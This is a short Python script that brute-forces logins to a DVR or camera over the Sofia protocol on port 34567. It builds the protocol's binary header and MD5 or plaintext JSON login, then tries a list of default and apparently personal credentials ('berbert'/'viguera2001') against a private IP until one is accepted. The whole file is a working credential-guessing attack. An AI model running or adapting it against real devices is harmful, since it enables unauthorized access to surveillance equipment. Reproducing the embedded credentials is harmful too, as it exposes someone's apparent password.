
import socket
import struct
import time
import hashlib
import json

def try_login(ip, port, user, password, hash_mode='md5'):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(2.0)
    try:
        sock.connect((ip, port))
    except:
        return False, "Connect Fail"

    pass_str = password
    if hash_mode == 'md5' and password:
        pass_str = hashlib.md5(password.encode()).hexdigest().upper()
    elif hash_mode == 'plain':
        pass_str = password # Envia a senha pura (alguns firmwares antigos)
        
    # Payload JSON
    json_body = '{"EncryptType":"MD5","LoginType":"cn","PassWord":"%s","UserName":"%s"}\n' % (pass_str, user)
    body_bytes = json_body.encode()
    
    # Header Construction
    # Head(1) Ver(1) Res(2) Sess(4) Seq(4) TotalLen(4) CurLen(4) MsgID(2) Res(1) Encode(1)
    header = struct.pack("<BB2sIIIIHH", 
        0xFF, 0x01, b'\x00\x00', 
        0, 0, 
        len(body_bytes), len(body_bytes), 
        1000, 
        0 
    )
    
    sock.send(header + body_bytes)
    
    try:
        resp = sock.recv(1024)
        if len(resp) >= 20:
             body = resp[20:].decode(errors='ignore')
             if '"Ret":100' in body or '"Ret": 100' in body:
                 return True, body
             return False, body
    except:
        pass
    finally:
        sock.close()
    return False, "No Response"

ip = "192.168.3.27"
port = 34567

attempts = [
    ("berbert", "viguera2001", "md5"),
    ("admin", "", "md5"),
    ("admin", "", "plain"),
    ("admin", "admin", "md5"),
    ("admin", "123456", "md5"),
    ("admin", "viguera2001", "md5"),
    ("default", "", "plain") # Às vezes user é default
]

print(f"--- BRUTE FORCE SOFIA {ip}:{port} ---")
for u, p, h in attempts:
    print(f"Tentando User='{u}' Pass='{p}' Mode='{h}'...", end="")
    success, msg = try_login(ip, port, u, p, h)
    if success:
        print(" SUCESSO! 🔓")
        print(f"Resposta: {msg}")
        break
    else:
        print(f" Falha. ({msg.strip()})")
